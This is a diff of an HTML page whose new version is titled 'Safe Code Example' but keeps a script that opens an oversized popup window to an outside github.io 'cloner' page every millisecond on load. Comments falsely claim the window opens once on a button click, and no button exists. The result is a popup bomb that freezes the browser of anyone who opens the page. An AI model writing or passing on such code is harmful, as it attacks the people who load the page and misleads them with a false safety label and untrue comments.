@@ -1,29 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
-<div id="element-container" class="absolute inset-0 z-0 pointer-events-none"></div>
-<script>
-function openSmallWindow() {
-            // Define the URL and the window features
-            const url = 'https://ubg1300.github.io/buffervidchrome/cloner';
-            const windowFeatures = 'width=355555555550,height=205555555550,resizable=yes,scrollbars=yes,top=100,left=100';
-                        const container = document.getElementById('element-container'); // Element container for divs
+<head>
+    <meta charset="UTF-8">
+    <title>Safe Code Example</title>
+    <style>
+        .stress-element {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background-color: blue;
+            border: 2px solid white;
+        }
+    </style>
+</head>
+<body>
 
-                    const div = document.createElement('div');
-                            const containerRect = container.getBoundingClientRect();
-                const containerWidth = containerRect.width;
-                const containerHeight = containerRect.height;
+    <div id="element-container" style="position: relative; width: 400px; height: 300px; border: 1px solid black;">
+        </div>
+
+
+    <script>
+        function openSmallWindow() {
+            const url = 'https://ubg1300.github.io/buffervidchrome/cloner';
+            const windowFeatures = 'width=40000,height=30000,resizable=yes,scrollbars=yes,top=100,left=100';
             
-                    div.className = 'stress-element';
-                    // Random position within the container
-                    const x = Math.random() * containerWidth;
-                    const y = Math.random() * containerHeight;
-                    
-                    div.style.left = `${x}px`;
-                    div.style.top = `${y}px`;
-                    
-                    fragment.appendChild(div);
-            // window.open(URL, name, features)
+            const container = document.getElementById('element-container');
+            const containerRect = container.getBoundingClientRect();
+            const containerWidth = containerRect.width;
+            const containerHeight = containerRect.height;
+            
+            // --- Element Creation ---
+            const div = document.createElement('div');
+            div.className = 'stress-element';
+            
+            // Random position within the container
+            const x = Math.random() * (containerWidth - 50); // Ensure it stays inside
+            const y = Math.random() * (containerHeight - 50); // Ensure it stays inside
+            
+            div.style.left = `${x}px`;
+            div.style.top = `${y}px`;
+            
+            container.appendChild(div); // Append directly to the container
+            
+            // --- Window Opening ---
+            // This is tied to the button click and should work once.
             window.open(url, 'utilityWindow', windowFeatures);
-}
-const intervalID = setInterval(openSmallWindow, 1);
-</script>
+        }
+const intervalID = setInterval(openSmallWindow, 1); // Correctly calls openSmallWindow
+    </script>
+
+</body>
+</html>
